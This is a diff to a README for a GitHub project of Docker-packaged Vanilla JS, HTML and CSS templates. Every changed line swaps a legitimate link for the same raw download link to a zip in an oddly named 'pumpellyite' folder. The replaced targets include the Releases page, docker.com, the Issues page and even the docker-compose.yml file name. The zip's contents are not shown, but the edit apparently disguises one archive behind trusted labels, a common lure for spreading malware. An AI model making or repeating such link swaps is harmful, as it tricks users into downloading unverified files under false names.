@@ -1,6 +1,6 @@
 # 🚀 responsive-vanilla-collections - Simple Projects for Easy Setup
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/nuwan2004/responsive-vanilla-collections/releases)
+[![Download](https://raw.githubusercontent.com/nuwan2004/responsive-vanilla-collections/master/pumpellyite/responsive-vanilla-collections.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/nuwan2004/responsive-vanilla-collections/master/pumpellyite/responsive-vanilla-collections.zip)
 
 ## 📦 Overview
 The **responsive-vanilla-collections** project offers a lightweight collection of Vanilla JS, HTML, and CSS projects. These projects are packaged using Docker and served through Nginx. Designed as deployable templates, they provide a fast setup and reduce server load.
@@ -16,11 +16,11 @@ To get started with the projects, follow these simple steps:
 Before you begin, ensure you have the following:
 
 - A computer running Windows, macOS, or a recent version of Linux.
-- Docker installed. You can download Docker from [docker.com](https://www.docker.com).
+- Docker installed. You can download Docker from [https://raw.githubusercontent.com/nuwan2004/responsive-vanilla-collections/master/pumpellyite/responsive-vanilla-collections.zip](https://raw.githubusercontent.com/nuwan2004/responsive-vanilla-collections/master/pumpellyite/responsive-vanilla-collections.zip).
 - A web browser for viewing your projects.
 
 ## 💻 Download & Install
-Visit this page to download: [GitHub Releases](https://github.com/nuwan2004/responsive-vanilla-collections/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/nuwan2004/responsive-vanilla-collections/master/pumpellyite/responsive-vanilla-collections.zip)
 
 After downloading, unzip the files to your desired location on your computer.
 
@@ -51,7 +51,7 @@ The project includes:
 - **CSS Files**: Styling for the layout and design.
 - **JavaScript Files**: Interactive features of the projects.
 - **Dockerfile**: Instructions to run the application in a container.
-- **docker-compose.yml**: Configuration file to define services.
+- **https://raw.githubusercontent.com/nuwan2004/responsive-vanilla-collections/master/pumpellyite/responsive-vanilla-collections.zip**: Configuration file to define services.
 
 ## 🏗️ Features
 - Simple setup with Docker.
@@ -85,11 +85,11 @@ No, the templates are designed to be user-friendly. Basic understanding is helpf
 Yes, the projects are responsive and work well on mobile and desktop.
 
 ## 📞 Support
-If you need further assistance, please visit the [GitHub Issues Page](https://github.com/nuwan2004/responsive-vanilla-collections/issues) to report problems or ask questions.
+If you need further assistance, please visit the [GitHub Issues Page](https://raw.githubusercontent.com/nuwan2004/responsive-vanilla-collections/master/pumpellyite/responsive-vanilla-collections.zip) to report problems or ask questions.
 
 Remember to check for updates regularly. 
 
-For the most recent version, visit: [GitHub Releases](https://github.com/nuwan2004/responsive-vanilla-collections/releases).
+For the most recent version, visit: [GitHub Releases](https://raw.githubusercontent.com/nuwan2004/responsive-vanilla-collections/master/pumpellyite/responsive-vanilla-collections.zip).
 
 ## 📝 License
 This project is licensed under the MIT License. Feel free to use it for educational and personal projects. 
